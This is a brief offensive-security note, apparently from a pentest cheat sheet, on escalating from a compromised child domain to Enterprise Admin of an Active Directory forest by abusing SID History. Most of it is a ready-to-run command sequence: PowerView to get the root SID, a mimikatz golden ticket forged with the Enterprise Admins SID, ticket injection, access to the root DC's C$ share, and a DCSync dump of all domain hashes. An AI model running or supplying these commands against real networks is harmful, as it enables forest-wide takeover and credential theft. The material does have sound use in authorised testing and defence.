If we manage to compromise a child domain of a forest and [SID filtering](https://www.itprotoday.com/windows-8/sid-filtering) isn't enabled (most of the times is not), we can abuse it to privilege escalate to Domain Administrator of the root domain of the forest. This is possible because of the [SID History](https://www.itprotoday.com/windows-8/sid-history) field on a kerberos TGT ticket, that defines the "extra" security groups and privileges.

Exploitation example:
```
#Get the SID of the Root Domain using PowerView
Get-DomainSID -Domain root.domain.local

#Create the Enteprise Admins SID
Format: S-1-5-21-RootDomainSID-519

#Forge "Extra" Golden Ticket using mimikatz
kerberos::golden /user:Administrator /domain:root.domain.local /sid:<CurrentDomainSID> /krbtgt:<krbtgtHash> /sids:<EnterpriseAdminsSID> /startoffset:0 /endin:600 /renewmax:10080 /ticket:\path\to\ticket\golden.kirbi

#Inject the ticket into memory
kerberos::ptt \path\to\ticket\golden.kirbi

#List the DC of the Root Domain
dir \\dc.root.domain.local\C$

#Or DCsync and dump the hashes using mimikatz
lsadump::dcsync /domain:root.domain.local /all
```
## SID-History injection
[SID-History Injection - Pentest Everything (gitbook.io)](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/access-token-manipultion/sid-history-injection)
